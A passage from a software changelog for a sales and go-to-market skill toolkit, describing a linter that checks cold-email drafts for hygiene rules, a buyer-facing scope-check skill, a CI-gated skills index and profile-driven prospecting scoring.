  stdlib-only gate for 1:1 cold-email packs. It stamps a `Rules-Version` and fails closed on
  stale packs, then enforces per-email hygiene (subject shape, `Hi <First>,` greeting, bare
  sign-off, word-count band, no links / em-dash / spintax / placeholders / banned fluff), a
  template-share ceiling across the pack, same-company divergence, a required *hedged* gap, an
  offer-shaped CTA, and a specificity-anchor floor. The case-study-company-name and
  mail-merge-"stem" checks are **file-driven** (`--case-study-file` / `--stem-file`) and empty
  by default, so you supply your own lists per profile — nothing is baked in.

### Changed
- **`draft-outreach`** and **`email-sequence`** now stamp every pack with the current
  `Rules-Version` and must pass the outreach linter with zero errors before a pack is presented
  as sendable. Drafting also gained a product-grounded compose step and a formality register.

## [0.1.0] - 2026-07-16

### Added
- Initial public release of the GTM engine, extracted from the private monorepo.
- **`solution-scope-check`** skill — turns a solution design (or a discovery brief) into a
  2-page, buyer-facing "scope check": page 1 restates the solution in plain terms, page 2 asks
  scope-validation questions drawn from a generic, reusable bank, each tagged with the design
  decision it unlocks and the assumption it tests. Runs pre-design (from `solution-discovery`) or
  post-design (from `solution-design`).
- Generated **`docs/SKILLS.md`** skill index — a single, always-current inventory of every skill,
  produced by `codegen` and gated in CI, so the skill list can never silently drift out of the
  docs (adding a skill regenerates the index or the build fails).
- Onboarding now scaffolds a per-profile **"Scoring & gates"** block, so a new profile is created
  with the prospecting rubric ready to fill in.

### Changed
- **`solution-design`** gained a richer visual layer in its HTML companion — a before→after
  outcome band, a numbered control strip, V1/V2 phase cards, and on-brand diagram theming — and
  now hands off to `solution-scope-check`.
- Prospecting is now fully profile-driven: the skill's `gates-and-scoring` reference holds only
  generic scoring machinery (gate/rubric shapes, heat axis, tiering, distribution, default
  thresholds), and each profile supplies its own gates, rubric line-items, and thresholds. The
  template profile ships a worked example.
- The skill inventory is no longer guarded by a hardcoded count; it is a generated, CI-gated index.
